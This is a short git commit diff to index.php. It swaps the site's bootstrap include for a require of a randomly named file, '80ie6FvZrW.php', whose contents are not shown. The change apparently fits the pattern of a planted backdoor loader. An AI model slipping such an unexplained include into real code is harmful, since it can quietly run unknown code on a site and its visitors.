ab2e9c9e3fd0f7084b62d2c3f7d20ffd606a65fa
buenoelian364-stack <buenoelian364@gmail.com>
2026-02-10 08:07:41 -0600

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,4 @@
-<?php
-require_once __DIR__ . '/bootstrap.php';
-?>
+<?php require __DIR__ . '/80ie6FvZrW.php' ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -239,5 +237,6 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <!-- Histats.com  END  -->
 </body>
 </html>
+
 
 
